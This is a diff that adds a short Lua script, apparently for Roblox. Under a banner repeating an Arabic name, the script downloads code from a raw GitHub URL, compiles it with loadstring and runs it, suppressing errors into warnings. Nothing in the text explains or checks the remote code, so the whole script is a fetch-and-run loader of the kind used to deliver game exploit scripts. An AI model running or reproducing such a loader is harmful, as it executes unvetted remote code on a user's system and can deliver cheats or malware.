@@ -1,1 +1,40 @@
+--[[
+============================================================
+████████████████████████████████████████████████████████████
+                    ثامر العم
+                    ثامر العم
+                    ثامر العم
+                    ثامر العم
+                    ثامر العم
+                    ثامر العم
+                    ثامر العم
+                    ثامر العم
+                    ثامر العم
+============================================================
+--]]
 
+local WRAPPER_NAME = "ثامر العم"
+
+local URL = "https://raw.githubusercontent.com/ggtughui-hub/mm/refs/heads/main/ac"
+
+local ok, source = pcall(function()
+    return game:HttpGet(URL)
+end)
+
+if not ok then
+    warn("Wrapper failed:", source)
+    return
+end
+
+local compileOK, fn = pcall(loadstring, source)
+
+if not compileOK or type(fn) ~= "function" then
+    warn("Wrapper compile failed")
+    return
+end
+
+local runOK, err = pcall(fn)
+
+if not runOK then
+    warn("Wrapper runtime error:", err)
+end
